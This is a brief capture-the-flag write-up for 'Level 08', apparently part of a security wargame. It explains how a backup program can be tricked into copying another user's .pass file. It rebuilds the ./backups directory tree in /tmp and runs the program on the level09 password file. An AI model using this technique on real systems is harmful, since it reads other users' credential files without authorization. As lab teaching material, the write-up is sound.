# Level 08

## Initial Context

- One file: `level08`

## Solving the Challenge

The program acts like a backups software.

It will:
- open `./backups/.log` to store the progress logs.
- open `argv[1]` (read)
- open `./backups/ + argv[1]` (write)
- and backup the content

If we try to open the next level's `.pass` file, it complains of not being able to open the corresponding backup file:

```bash
$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Since we cannot create directory in the `level08`'s home, we need to move to `/tmp`.

By re-creating the `./backups` directory and the path of `level09`'s `.pass` in `/tmp` and trying to re-run the program we can get the flag:

```bash
$ mkdir -p ./backups/home/users/level09/
$ /home/users/level08/level08 /home/users/level09/.pass
$ cat backups/home/users/level09/.pass 
<flag>
```
